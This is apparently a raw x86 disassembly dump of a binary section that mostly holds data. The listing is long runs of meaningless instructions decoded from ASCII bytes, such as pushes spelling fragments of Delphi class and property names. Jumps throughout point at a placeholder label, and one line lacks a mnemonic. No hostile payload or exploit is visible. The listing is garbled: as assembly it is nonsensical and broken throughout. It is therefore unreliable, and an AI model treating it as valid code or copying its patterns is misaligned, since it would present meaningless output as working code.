add [ eax ] cl
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add al al
cmc
inc esi
add [ eax ] cl
imul esi [ ebx + 0x70 ] 0x68637461
or [ ecx + 0x44 ] ecx
dec ecx
inc esp
jo r-xdata
imul esi [ ebp ] 0x41070802
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
jns r-xdata
dec ecx
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
popad
je r-xdata
test [ ecx ] dl
inc eax
add ah dl
adc [ eax ] eax
int3
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
insb
test [ esi ] 0x8
adc al 0x54
dec ecx
je r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
or cl [ eax ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
sbb dl [ ebx + eax * 2 + 0x6f ]
outsb
je r-xdata
jb r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
or [ edi + 0x6f ] dl
jb r-xdata
insd
push ebx
outsb
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
inc edx
outsw
jb r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax + r-xdata ] dl
or [ ecx ] dl
push esp
inc ebx
outsd
inc eax
add ah cl
adc [ eax ] al
nop
int3
insb
insb
outsb
je r-xdata
nop
adc bh dh
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6f ] edx
outsd
outsb
jae r-xdata
add ecx [ eax ]
pop es
inc ecx
push ebx
arpl [ gs : ecx + eax + 0x6 ] si
insd
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push 0x61430601
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
push edx
jo r-xdata
insd
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
jns r-xdata
inc ebx
outsd
outsb
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ edi + esi * 8 + 0x46 ] dl
add [ eax ] cl
sbb al 0x54
inc ebx
outsd
outsb
je r-xdata
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
add [ esi ] eax
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
inc ebx
push 0x4e6b6365
popad
insd
jae r-xdata
outsb
push edi
jb r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
push edx
jae r-xdata
or cl [ eax ]
adc [ eax ] eax
int3
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
inc esi
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax + r-xdata ] dl
or [ ecx ] bl
push esp
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
je r-xdata
insd
inc esi
outsd
jb r-xdata
inc ecx
push ebx
outsb
jb r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
outsb
je r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
inc ecx
je r-xdata
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
add [ eax ] cl
and [ ebx + eax * 2 + 0x6f ] dl
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
inc ebx
add [ esi ] eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
je r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
inc ecx
je r-xdata
popad
outsb
push ebx
outsb
jb r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
inc ecx
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
inc ecx
je r-xdata
or cl [ edx ]
push esp
dec edi
add [ ebx + 0x46f8bcc0 ] cl
add [ eax ] cl
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
add [ eax ] cl
sbb dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
add ecx [ eax ]
pop es
push 0x65
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
push esp
inc ebx
outsd
popad
jbe r-xdata
or cl [ edx ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
or [ edi + 0x6f ] dl
jb r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
je r-xdata
stc
inc esi
add ah cl
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
je r-xdata
inc ecx
dec ecx
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
or al [ ecx + ecx * 2 ]
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
dec ecx
push es
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
je r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
stc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
nop
stc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb907 ] ch
sbb [ ebx + eax * 2 + 0x6f ] dl
inc edx
outsd
outsd
insb
add [ ecx + edx - 0x10ebffc0 ] al
outsb
je r-xdata
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
add [ esp + edx * 2 ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ edx - 0x2bffb907 ] bh
inc esp
insb
adc [ eax ] eax
int3
je r-xdata
inc edx
outsw
jb r-xdata
insd
inc esi
add [ ebx + 0x46f7f8c0 ] cl
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
test al 0x41
add [ eax - 0x1 ] dl
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
or [ ecx ] 0x47
add al al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
insd
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add al cl
jmp r-xdata
inc edx
add [ esi ] eax
inc ecx
je r-xdata
add [ eax ] al
add [ edi ] ah
inc esi
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x3fffb8f7 ] al
add ah dl
inc ecx
push ebx
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
je r-xdata
or cl [ edx ]
arpl [ edx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc esi
add ah cl
adc [ eax ] al
mov eax eax
mov esp 0x80046f8
adc [ eax ] eax
adc al 0xef
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0006 ] al
outsb
inc ebx
jne r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
nop
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edx 0xd40046f9
inc edx
outsw
jb r-xdata
insd
outsd
outsd
inc edx
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
inc esi
add [ eax + r-xdata ] dl
or [ eax ] ah
push esp
inc ebx
outsd
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
add [ eax ] al
or [ ecx ] 0x0
pop es
dec edi
je r-xdata
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
push es
add [ edi ] al
dec edi
outsb
push edx
jo r-xdata
mov esp 0x780046f5
add [ eax ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f070009 ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120010 ] al
outsb
jns r-xdata
add bh bh
rol [ eax ] 0x0
inc ebx
push 0x4e6b6365
inc edx
outsw
jb r-xdata
test [ esi ] 0xff0000a8
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
adc cl [ edi + 0x6e ]
test [ esi ] 0x90
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000d ] al
outsb
push edx
jo r-xdata
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000e ] al
outsb
push ebx
outsb
or al 0xf7
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000f ] al
outsb
push edi
test [ esi ] 0xff0000b0
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
cmovg ebp [ esi + 0x41 ]
je r-xdata
popad
insd
jae r-xdata
arpl [ gs : ebx + 0x4e ] bp
jns r-xdata
push 0x61430601
inc edx
outsd
outsd
insb
add ah cl
adc [ eax ] al
lodsb [ esi ]
cld
inc esi
add [ eax ] cl
sbb [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
adc [ edi + 0x6e ] cl
inc ecx
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
push cs
dec edi
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
insb
insb
enter 0x46f6 0x0
cwde
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
add [ ecx ] dl
inc eax
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah dl
adc [ eax ] eax
int3
adc [ eax ] al
mov eax eax
sub ch bh
inc esi
insd
add [ eax ] cl
and [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
inc ebx
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push 0x65
popad
jbe r-xdata
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
push eax
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax + ecx ] al
inc esp
insb
je r-xdata
add [ eax + 0x4f160013 ] al
outsb
inc edx
outsw
jb r-xdata
add [ eax ] al
hlt
add [ gs : edx ] al
insd
arpl [ edx + ecx + 0x7 ] si
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
jae r-xdata
je r-xdata
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ esp + edi * 8 + 0x19080046 ] ch
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
outsb
inc edx
mov eax 0xc80046f8
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0014 ] al
jae r-xdata
je r-xdata
outsw
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
popad
dec eax
clc
inc esi
add al al
add [ eax ] al
inc eax
add [ eax ] al
or al [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx + 0x44 ] ecx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x6 ] si
pop es
inc ecx
push ebx
outsb
jb r-xdata
add al 0x8
nop
push 0x80046fc
adc [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
add [ esi ] eax
inc ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
popad
jb r-xdata
inc esi
add [ eax ] cl
sbb edx [ esp + eax * 2 + 0x69 ]
popad
jb r-xdata
or [ fs : ecx + 0x44 ] ecx
je r-xdata
inc esi
outsd
jb r-xdata
dec ecx
je r-xdata
insd
inc ecx
outsd
push es
insd
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
outsd
outsb
jae r-xdata
imul esi [ ebx + 0x70 ] 0x68637461
or cl [ eax ]
push edx
jae r-xdata
dec ecx
inc esp
dec edi
jo r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or [ edx ] dl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
inc edx
outsd
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
jae r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push eax
jb r-xdata
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ ebp - 0x1dbffc0 ] cl
imul esi [ ebx + 0x70 ] 0x68637461
or [ ecx + 0x44 ] ecx
jae r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
mov eax eax
fdiv st5
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
insd
push eax
jb r-xdata
jb r-xdata
inc ebx
jne r-xdata
insd
imul ebp [ edi + 0x6e ] 0x69444909
jae r-xdata
outsb
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
jl r-xdata
arpl [ gs : edx + eax + 0x4 ] si
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
jns r-xdata
insd
or al [ edi ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
push 0x61430601
outsd
outsb
jae r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
jo r-xdata
popad
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
inc esp
jo r-xdata
dec esi
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
popad
je r-xdata
inc ebx
add [ esi ] eax
arpl [ ecx + eax + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
dec esi
inc ebx
insb
outsd
jae r-xdata
insd
add [ ebp + edi * 8 + 0x46 ] bh
add [ eax ] cl
adc al 0x54
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
inc esi
inc eax
add ah cl
adc [ eax ] al
xor al 0xff
inc esi
add [ eax ] cl
adc [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
insb
insb
add [ ebx ] al
or [ edi ] al
jb r-xdata
jns r-xdata
dec ecx
je r-xdata
inc edx
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
inc esp
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
lea eax [ eax ]
aam 0xfe
inc esi
add [ eax ] cl
adc eax 0x73694454
push edx
jae r-xdata
jb r-xdata
je r-xdata
or [ 0x73694454 ] dl
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
mov eax eax
add al 0x4e
or [ edi ] al
inc ecx
push ebx
add [ edx ] al
jb r-xdata
pop es
push 0x6552080a
jae r-xdata
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ ebp - 0x3fffc0 ] cl
inc esi
add [ eax ] cl
sbb eax 0x73694454
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push ebx
outsb
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
or cl [ eax ]
push edx
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
add ecx [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
insd
aam 0x11
imul esi [ ebx + 0x74 ] 0x6d657449
push edx
jo r-xdata
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push 0x61430601
jns r-xdata
je r-xdata
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
jns r-xdata
popad
add al [ esi + ecx * 2 ]
push esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
js r-xdata
outsd
outsb
jae r-xdata
or cl [ eax ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
add [ eax ] cl
sbb edx [ esp + eax * 2 + 0x69 ]
jae r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax ] dl
add [ edi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push es
je r-xdata
dec ecx
je r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
inc ecx
push ebx
outsb
push edx
jo r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
inc esi
outsd
jb r-xdata
insd
inc ecx
push ebx
outsb
jb r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
insd
inc ecx
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
inc ebx
push 0x4e6b6365
popad
insd
jae r-xdata
dec ecx
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax - 0x1 ] bh
inc [ esi ]
or [ edx ] dl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
adc [ eax ] eax
int3
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
or [ ecx + 0x44 ] ecx
inc ecx
push ebx
outsb
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
je r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
add al [ esi + ecx * 2 ]
push esp
dec edi
or cl [ edx ]
inc ecx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
or [ ecx ] ah
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
outsb
inc edx
outsw
jb r-xdata
insd
push edi
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or cl [ edx ]
inc ecx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
push 0x65
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
or [ edi + 0x6f ] dl
jb r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
insd
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
add [ esi ] eax
inc ecx
je r-xdata
or cl [ edx ]
push esp
dec edi
push es
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
add [ fs : edx ] al
or [ edx ] bl
push esp
inc esp
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
rol [ ecx ] 0x1
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax ] dl
inc edi
add [ eax ] bh
add al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
outsd
outsd
insb
add [ ecx + edx - 0x10ebffc0 ] al
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
aam 0x0
add [ eax ] al
and al 0xe7
inc esi
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
je r-xdata
inc ecx
je r-xdata
push ebx
inc ecx
je r-xdata
insd
dec ecx
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add al cl
jmp r-xdata
inc edx
add [ esi ] eax
inc ecx
je r-xdata
popad
jbe r-xdata
add [ 0x73694454 ] cl
je r-xdata
add [ esi ] ah
add al [ edi ]
inc edx
outsw
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
inc edx
outsw
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
inc esi
add ah cl
adc [ eax ] al
nop
sub [ ecx ] al
inc edi
add [ eax ] cl
sbb [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
adc [ eax ] eax
adc al 0xef
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add al [ es : edi ]
inc esp
insb
adc [ eax ] eax
int3
je r-xdata
add ecx [ eax ]
pop es
je r-xdata
add [ ebx ] al
or [ edi ] al
inc esi
add [ eax + r-xdata ] dl
or [ ebx ] bl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
outsd
outsd
inc edx
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
outsb
dec edi
jo r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
cmp [ edx ] al
inc edi
add [ edi ] al
or eax 0x73694454
je r-xdata
inc esi
add [ eax + 0x8004700 ] bh
and [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
inc ecx
push ebx
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
or al [ ecx + ecx * 2 ]
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
dec ecx
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
push es
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
or [ edi + 0x6e ] ecx
outsb
test al 0xfc
inc esi
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0006 ] al
outsb
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ esi ] cl
dec edi
imul esi [ ebx + 0x74 ] 0x6d657449
rol [ ecx ] 0x1
inc edi
add ah dl
out 0x46 eax
add [ 0x754f0900 ] dl
je r-xdata
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x3fffb8f2 ] ah
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
pushfd
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
insd
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
pop es
popad
jb r-xdata
add [ eax ] al
or [ ecx ] 0x0
je r-xdata
dec edi
outsd
outsd
imul ebx [ eax + 0x50 ] 0x10
add [ esp + edi * 8 + 0x46 ] ah
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120010 ] al
outsb
inc edx
outsw
jb r-xdata
jns r-xdata
or [ ebx ] 0x0
push es
dec edi
fdivr st5
inc esi
add [ eax ] dh
add bh bh
jo r-xdata
dec edi
add [ edi ] al
and dh bh
inc esi
add [ eax ] bh
add bh bh
js r-xdata
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f070009 ] al
outsb
inc ebx
jne r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and al 0xfd
inc esi
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f160007 ] al
outsb
je r-xdata
add bh bh
rol [ eax ] 0x0
inc ebx
push 0x4e6b6365
outsb
push edx
popad
jo r-xdata
add [ eax ] al
inc [ esi ]
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000d ] al
jo r-xdata
outsb
inc esi
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000c ] al
pop es
dec edi
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
jns r-xdata
jo r-xdata
adc [ edi + 0x6e ] cl
insd
push eax
jb r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ed48
lea eax [ ebx + 0x9c ]
mov edx [ ebp - 0x4 ]
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0011 ] al
outsb
inc ecx
je r-xdata
add [ edi ] al
mov al 0x0
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
cmovg ebp [ esi + 0x41 ]
popad
insd
jae r-xdata
arpl [ gs : ebx + 0x4e ] bp
jb r-xdata
insb
insb
xor bh bh
inc esi
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
outsb
push edx
jo r-xdata
add [ edx ] cl
dec edi
jb r-xdata
jb r-xdata
jo r-xdata
mov ecx r-xdata
